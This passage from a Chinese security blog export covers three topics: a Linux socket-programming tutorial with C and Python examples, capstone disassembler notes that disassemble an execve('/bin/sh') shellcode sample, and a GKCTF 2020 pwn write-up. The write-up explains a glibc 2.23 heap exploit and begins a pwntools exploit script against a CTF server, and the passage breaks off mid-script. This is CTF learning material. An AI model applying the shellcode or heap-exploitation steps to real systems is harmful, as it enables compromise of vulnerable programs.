<h3 id="list-、connect-函数"><a href="#list-、connect-函数" class="headerlink" title="list()、connect()函数"></a>list()、connect()函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">list</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure>

<p>list()函数用于服务器端侦听端口。</p>
<p>connect()函数用于客户端向服务器端发送连接请求。</p>
<h3 id="accept-函数"><a href="#accept-函数" class="headerlink" title="accept()函数"></a>accept()函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;<span class="comment">//返回connect_fd</span></span><br></pre></td></tr></table></figure>

<p>该函数用于服务器端在list()之后接收请求，其中第二个参数addr用来接收返回值，返回值指向客户端地址。</p>
<p>注：accept默认会阻塞进程，直到有一个客户连接建立后返回。</p>
<h3 id="读写操作函数"><a href="#读写操作函数" class="headerlink" title="读写操作函数"></a>读写操作函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">send</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recv</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sendto</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags, <span class="keyword">const</span> struct sockaddr *dest_addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recvfrom</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> len, <span class="keyword">int</span> flags, struct sockaddr *src_addr, <span class="keyword">socklen_t</span> *addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sendmsg</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct msghdr *msg, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">recvmsg</span><span class="params">(<span class="keyword">int</span> sockfd, struct msghdr *msg, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>

<p>这些函数用于接收和发送数据，不一一介绍，具体看man文档。</p>
<h3 id="close-函数"><a href="#close-函数" class="headerlink" title="close()函数"></a>close()函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br></pre></td></tr></table></figure>

<p>该函数用于关闭连接。</p>
<p>注：close操作只是使用相应socket描述字的引用计数减1，只有当引用计数为0时，才会触发TCP客户端向服务器发送终止连接请求。</p>
<h2 id="socket中TCP的建立"><a href="#socket中TCP的建立" class="headerlink" title="socket中TCP的建立"></a>socket中TCP的建立</h2><p>TCP协议通过三个报文段完成连接的建立，即三次握手：</p>
<ul>
<li>第一次握手：建立连接时，客户端发送syn包到服务器，并进入SYN_SEND状态，等待服务器确认。（SYN：同步序列编号）</li>
<li>第二次握手：服务器收到syn包，必须确认客户的SYN，同时自己也发送一个SYN包，即SYN+ACK包，此时服务器进入SYN_RECV状态。</li>
<li>第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。</li>
</ul>
<h2 id="TCP连接的终止"><a href="#TCP连接的终止" class="headerlink" title="TCP连接的终止"></a>TCP连接的终止</h2><p>终止一个连接要经过四次握手，这是由TCP的半关闭造成的。</p>
<ol>
<li>客户端发送一个FIN，用来关闭客户端到服务器端的数据传送。</li>
<li>服务器端收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。</li>
<li>服务器端关闭与客户端的连接，发送一个FIN给客户端。</li>
<li>客户端发回ACK报文确认，并将确认序号设置为收到序号加1。</li>
</ol>
<h2 id="socket编程实例"><a href="#socket编程实例" class="headerlink" title="socket编程实例"></a>socket编程实例</h2><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><h4 id="服务器端"><a href="#服务器端" class="headerlink" title="服务器端"></a>服务器端</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 4096</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> socket_fd, connect_fd;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line">	<span class="keyword">char</span> buf[BUFSIZE];</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">if</span>( (socket_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>) ) == <span class="number">-1</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"create socket error: %s(errno: %d)\n"</span>,strerror(errno), errno);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memset</span>(&amp;servaddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(servaddr) );</span><br><span class="line">	servaddr.sin_family = AF_INET;</span><br><span class="line">	servaddr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">	servaddr.sin_port = htons(<span class="number">8000</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(bind(socket_fd, (struct sockaddr*)&amp;servaddr, <span class="keyword">sizeof</span>(servaddr)) == <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"bind socket error: %s(errno: %d)\n"</span>,strerror(errno), errno);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">listen</span>(socket_fd, <span class="number">10</span>) == <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"listen socket error: %s(errno: %d)\n"</span>,strerror(errno), errno);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"=====wait for connect====\n"</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>( (connect_fd = accept(socket_fd, (struct sockaddr*)<span class="literal">NULL</span>, <span class="literal">NULL</span>) ) == <span class="number">-1</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"accept socket error: %s(errno: %d)\n"</span>,strerror(errno), errno);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">		n = recv(connect_fd, buf, BUFSIZE, <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">if</span>(!fork())&#123;</span><br><span class="line">			<span class="keyword">if</span>(send(connect_fd, <span class="string">"Hello, you are connect"</span>, <span class="number">27</span>, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">				perror(<span class="string">"send_error"</span>);</span><br><span class="line">			<span class="built_in">close</span>(connect_fd);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">		buf[n] = <span class="string">'\0'</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"you have recv msg: %s\n"</span>,buf);</span><br><span class="line">		<span class="built_in">close</span>(connect_fd);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">close</span>(socket_fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 4096</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> socket_fd, n, rec_len;</span><br><span class="line">	<span class="keyword">char</span> sendline[BUFSIZE];</span><br><span class="line">	<span class="keyword">char</span> buf[BUFSIZE];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line">	<span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"usage: ./client &lt;ipaddress&gt;"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>( (socket_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>) ) &lt; <span class="number">0</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"create socket error: %s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memset</span>(&amp;servaddr, <span class="number">0</span>, <span class="keyword">sizeof</span>(servaddr));</span><br><span class="line">	servaddr.sin_family = AF_INET;</span><br><span class="line">	servaddr.sin_port = htons(<span class="number">8000</span>);</span><br><span class="line">	<span class="keyword">if</span>( inet_pton(AF_INET, argv[<span class="number">1</span>], &amp;servaddr.sin_addr) &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"inet_pton error for %s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">connect</span>(socket_fd, (struct sockaddr*)&amp;servaddr, <span class="keyword">sizeof</span>(servaddr) ) &lt; <span class="number">0</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"connect socket error: %s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"send msg to server: \n"</span>);</span><br><span class="line">	fgets(sendline, BUFSIZE, <span class="built_in">stdin</span>);</span><br><span class="line">	<span class="keyword">if</span>(send(socket_fd, sendline, <span class="built_in">strlen</span>(sendline), <span class="number">0</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"send msg error:%s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>( (rec_len = recv(socket_fd, buf, BUFSIZE, <span class="number">0</span>) ) == <span class="number">-1</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"recv msg error:%s(errno: %d)\n"</span>, strerror(errno), errno);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	buf[rec_len] = <span class="string">'\0'</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Recvived : %s\n"</span>, buf);</span><br><span class="line">	<span class="built_in">close</span>(socket_fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><h4 id="服务器端-1"><a href="#服务器端-1" class="headerlink" title="服务器端"></a>服务器端</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket()</span><br><span class="line">host = socket.gethostname()</span><br><span class="line">port = <span class="number">8000</span></span><br><span class="line">s.bind((host, port))</span><br><span class="line"></span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	c,addr = s.accept()</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'address'</span>,addr</span><br><span class="line">	msg = <span class="string">"welcome to my service. \nif you want to exit, please input exit."</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">		c.send(msg)</span><br><span class="line">		buf = c.recv(<span class="number">1024</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'exit'</span> <span class="keyword">in</span> buf:</span><br><span class="line">			c.close()</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		msg = <span class="string">"you have input: "</span>+buf</span><br></pre></td></tr></table></figure>

<h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">s = socket.socket()</span><br><span class="line">host = socket.gethostname()</span><br><span class="line">port = <span class="number">8000</span></span><br><span class="line">s.connect((host, port))</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">	buf = sys.stdin.readline()</span><br><span class="line">	s.send(buf)</span><br><span class="line">	<span class="keyword">print</span> s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'exit'</span> <span class="keyword">in</span> buf:</span><br><span class="line">		s.close()</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>Linux的SOCKET编程详解 - 江召伟 - 博客园  <a href="https://www.cnblogs.com/jiangzhaowei/p/8261174.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiangzhaowei/p/8261174.html</a></p>
<p>Python 网络编程 | 菜鸟教程  <a href="https://www.runoob.com/python/python-socket.html" target="_blank" rel="noopener">https://www.runoob.com/python/python-socket.html</a></p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>socket</tag>
        <tag>c</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>capstone学习笔记</title>
    <url>/2020/05/19/RE/capstone%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复现网鼎的题目的时候看到大佬用了Capstone，结果看不懂。。。。就顺便学习下。。</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>感觉还是看官方文档更全面一点：<a href="http://www.capstone-engine.org/lang_python.html" target="_blank" rel="noopener">http://www.capstone-engine.org/lang_python.html</a></p>
<p>这里就搞几个小脚本来学习下怎么用。</p>
<h3 id="脚本1：基础反汇编"><a href="#脚本1：基础反汇编" class="headerlink" title="脚本1：基础反汇编"></a>脚本1：基础反汇编</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)<span class="comment">#设置cpu体系为64位的x86</span></span><br><span class="line">cs.detail = <span class="literal">True</span></span><br><span class="line">code = <span class="string">'\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'</span></span><br><span class="line">discode = cs.disasm(code, <span class="number">0x400800</span>)<span class="comment">#反汇编代码，其实地址为0x400800</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> discode:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"0x%x:\t%s\t%s"</span> % (i.address,i.mnemonic,i.op_str)</span><br></pre></td></tr></table></figure>

<p>直接运行，就可以得到类似ida中看到的内容：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python example1.py</span><br><span class="line">0x400800:       jmp     0x40080d</span><br><span class="line">0x400802:       pop     rbx</span><br><span class="line">0x400803:       xor     eax, eax</span><br><span class="line">0x400805:       xor     ecx, ecx</span><br><span class="line">0x400807:       xor     edx, edx</span><br><span class="line">0x400809:       mov     al, 0xb</span><br><span class="line">0x40080b:       int     0x80</span><br><span class="line">0x40080d:       call    0x400802</span><br></pre></td></tr></table></figure>

<p>上面for循环遍历出来的i有如下几个成员：</p>
<table>
<thead>
<tr>
<th>成员名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>汇编指令的id</td>
</tr>
<tr>
<td>address</td>
<td>代码地址</td>
</tr>
<tr>
<td>mnemonic</td>
<td>汇编指令</td>
</tr>
<tr>
<td>op_str</td>
<td>操作对象字符串</td>
</tr>
<tr>
<td>size</td>
<td>汇编指令的大小</td>
</tr>
<tr>
<td>bytes</td>
<td>返回对应汇编指令的机器码</td>
</tr>
<tr>
<td>operands</td>
<td>操作对象（后面介绍）</td>
</tr>
</tbody></table>
<h3 id="脚本2：operands尝试"><a href="#脚本2：operands尝试" class="headerlink" title="脚本2：operands尝试"></a>脚本2：operands尝试</h3><p>operands也包含了很多成员，下面跟着官方文档来尝试操作下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone.x86 <span class="keyword">import</span> *</span><br><span class="line">cs = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">cs.detail = <span class="literal">True</span></span><br><span class="line">code = <span class="string">'\x8B\x87\x76\x98\x00\x00\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'</span></span><br><span class="line"><span class="keyword">for</span> insn <span class="keyword">in</span> cs.disasm(code, <span class="number">0x1000</span>):</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"0x%x:\t%s\t%s"</span> % (insn.address,insn.mnemonic,insn.op_str)</span><br><span class="line">	c = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> insn.operands:</span><br><span class="line">		c+=<span class="number">1</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"\toperands[%d]:"</span>%c</span><br><span class="line">		<span class="keyword">if</span> i.type == X86_OP_REG:</span><br><span class="line">			<span class="keyword">print</span><span class="string">"\t\tREG=%s"</span>%(insn.reg_name(i.value.reg))<span class="comment">#获取寄存器的名称</span></span><br><span class="line">		<span class="keyword">if</span> i.type == X86_OP_IMM:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"\t\tIMM=0x%x"</span>%(i.value.imm)<span class="comment">#获取立即数</span></span><br><span class="line">		<span class="keyword">if</span> i.type == X86_OP_MEM:<span class="comment">#如[rax+0x10]或[rax+rbx]</span></span><br><span class="line">			<span class="keyword">if</span> i.mem.base != <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">"\t\tREG=%s"</span>%(insn.reg_name(i.mem.base))<span class="comment">#获取寄存器名称，即rax</span></span><br><span class="line">			<span class="keyword">if</span> i.mem.index != <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">"\t\tIMM=0x%x"</span>%(i.mem.index)<span class="comment">#获取第二个寄存器名称，即rbx</span></span><br><span class="line">			<span class="keyword">if</span> i.mem.disp != <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">"\t\tIMM=0x%x"</span>%(i.mem.disp)<span class="comment">#获取偏移量，即0x10</span></span><br></pre></td></tr></table></figure>

<p>对应的输出：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python example2.py</span><br><span class="line">0x1000: mov     eax, dword ptr [rdi + 0x9876]</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=eax</span><br><span class="line">        operands[2]:</span><br><span class="line">                REG=rdi</span><br><span class="line">                IMM=0x9876</span><br><span class="line">0x1006: jmp     0x1013</span><br><span class="line">        operands[1]:</span><br><span class="line">                IMM=0x1013</span><br><span class="line">0x1008: pop     rbx</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=rbx</span><br><span class="line">0x1009: xor     eax, eax</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=eax</span><br><span class="line">        operands[2]:</span><br><span class="line">                REG=eax</span><br><span class="line">0x100b: xor     ecx, ecx</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=ecx</span><br><span class="line">        operands[2]:</span><br><span class="line">                REG=ecx</span><br><span class="line">0x100d: xor     edx, edx</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=edx</span><br><span class="line">        operands[2]:</span><br><span class="line">                REG=edx</span><br><span class="line">0x100f: mov     al, 0xb</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=al</span><br><span class="line">        operands[2]:</span><br><span class="line">                IMM=0xb</span><br><span class="line">0x1011: int     0x80</span><br><span class="line">        operands[1]:</span><br><span class="line">                IMM=0x80</span><br><span class="line">0x1013: call    0x1008</span><br><span class="line">        operands[1]:</span><br><span class="line">                IMM=0x1008</span><br></pre></td></tr></table></figure>

<p>呃。。。大概就先这样吧，后面有遇到需要再补充</p>
]]></content>
      <categories>
        <category>RE</category>
      </categories>
      <tags>
        <tag>RE</tag>
        <tag>tool</tag>
        <tag>python</tag>
        <tag>ida</tag>
      </tags>
  </entry>
  <entry>
    <title>2020GKCTF-pwn</title>
    <url>/2020/05/24/wp/2020GKCTF/2020GKCTF-pwn/</url>
    <content><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="domo"><a href="#domo" class="headerlink" title="domo"></a>domo</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>挺简单的一道pwn题，具有add、delete、show功能，同时可以任意地址写一字节。</p>
<p>题目环境是libc2.23的，所以利用方式比较简单。</p>
<p>首先通过fastbin和unsortbin来leak libc和heap。</p>
<p>然后申请4个chunk，在申请第二个chunk的时候顺便将第三个chunk的prev_size位设置为第一第二个chunk的大小；然后free掉第一个；再将第三个chunk的size的p位清0，free掉第三个chunk，就可以实现chunk extended。接着重新申请就可以得到两个同时指向chunk2的指针，然后就是fastbin attack那些操作了。。。</p>
<p>最后getshell的话是利用scanf输入较大数据的时候会malloc（这一机制也会触发malloc_consolidate机制，具体可以在网上找找文章，这里没用到就不详细讲了），已经就可以绕过后面seccomp的防护以及对堆操作的检查。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./domo"</span>)</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"26472"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./domo"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"5: Exit"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"size:"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"5: Exit"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"5: Exit"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(addr,byte)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"5: Exit"</span>)</span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line">	p.sendline(str(addr))</span><br><span class="line">	p.recvuntil(<span class="string">"num:"</span>)</span><br><span class="line">	p.sendline(byte)</span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'\n'</span>)<span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) <span class="number">-0x3C4B0A</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span 